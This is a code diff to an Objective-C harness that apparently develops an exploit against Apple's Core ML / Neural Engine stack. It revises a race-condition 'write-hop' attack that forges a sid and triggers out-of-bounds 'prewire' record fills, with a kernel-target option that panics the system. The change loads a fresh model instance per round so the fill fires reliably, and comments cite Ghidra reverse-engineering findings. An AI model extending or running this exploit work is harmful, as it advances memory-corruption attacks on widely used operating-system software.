@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v9-cookie"
+#define P088_BUILD @"p088-write-hop-v10-fresA"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -884,7 +884,7 @@ static NSString *p088_yfmt(double y) {
     }
 
     /* ---- PHASE F: A-first race, B volley, sentinel-net adjacency ---- */
-    p088_log(@"--- PHASE F (v6): %u rounds; persistent run; forge sid=%u ---",
+    p088_log(@"--- PHASE F (v10 fresh-A): %u rounds; persistent run; forge sid=%u ---",
              P088_ROUNDS, forgeSid);
     uint32_t touches = 0, fillHits = 0, bFires = 0, bAnom = 0;
     double lastATms = 5.0;   /* warm prior: fill lands ~3ms after A dispatch */
@@ -972,7 +972,22 @@ static NSString *p088_yfmt(double y) {
                      nRun - 2, h + 1, h, h, h + 1, h + 1);
         }
 
-        /* --- dispatch A (fill fires at ~tA inside A's submit) --- */
+        /* --- dispatch A (fill fires at ~tA inside A's submit) ---
+           v10 FRESH-INSTANCE A (p087→p073 v6 lesson, note 220/221): a repeat
+           predict on the SAME model instance is a CheckandPrewire resource
+           CACHE HIT — the record loop (`local_88 == 0` gate, Ghidra
+           874c070) never runs and NO records are written. v9's rounds
+           1-3 rejected in 1.7-1.8ms with cum-1 fills = cached A, not
+           "per-predict fill". Load a fresh A per round: new program
+           stream => all resources are lookup misses => a genuine fill
+           fires in every round's window. */
+        MLModelConfiguration *cfgA10 = [[MLModelConfiguration alloc] init];
+        cfgA10.computeUnits = P088_ANE_UNITS;
+        NSError *lErrA10 = nil;
+        MLModel *mA10 = [MLModel modelWithContentsOfURL:
+                          p088_model_url(P088_ADDCHAIN) configuration:cfgA10 error:&lErrA10];
+        MLModel *mUse = mA10 ?: mA;
+        if (!mA10) p088_log(@"  [v10] A load FAILED %@ — falling back to cached A", lErrA10 ?: @"-");
         __block double yA = NAN;
         __block NSString *aErr = @"none";
         __block NSTimeInterval dA = 0;
@@ -980,7 +995,7 @@ static NSString *p088_yfmt(double y) {
         CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
         dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
             NSError *e = nil;
-            yA = p088_predict(mA, fpA, &dA, &e);
+            yA = p088_predict(mUse, fpA, &dA, &e);
             aErr = e.localizedDescription ?: @"none";
             dispatch_semaphore_signal(aDone);
         });
@@ -1131,8 +1146,10 @@ static NSString *p088_yfmt(double y) {
        AFTER the CheckandPrewire fill already fired (09:24 panic pc inside
        the prewire at record 192 = the first OOB entry). Completion is NOT
        required for the hop and NOT the signal; the content check is. */
-    p088_log(@"A last err=%@ (downstream reject - EXPECTED; the prewire fill", lastAErr);
-    p088_log(@"fired per predict regardless). aOK(ever completed)=%d.", aOK ? 1 : 0);
+    p088_log(@"A last err=%@ (downstream reject - EXPECTED; with v10 fresh-A every", lastAErr);
+    p088_log(@"round prewired anew: same-instance repeats are cache hits that write");
+    p088_log(@"NO records (v9's 'per-predict fill' was wrong - the t=1.7ms rounds");
+    p088_log(@"were caches). aOK(ever completed)=%d.", aOK ? 1 : 0);
     p088_log(@"D2 ourBand entries across all hits: %u (0 = every observed fill was", g_p088_ourBandTotal);
     p088_log(@"foreign). OUR fill observed = ourBand>0 or record-195 sid==forgeSid.");
     p088_log(@"v9 zone-cookie records (symbol 0xC0..0xFF = OOB band) across all hits: %u", g_p088_cookieTotal);
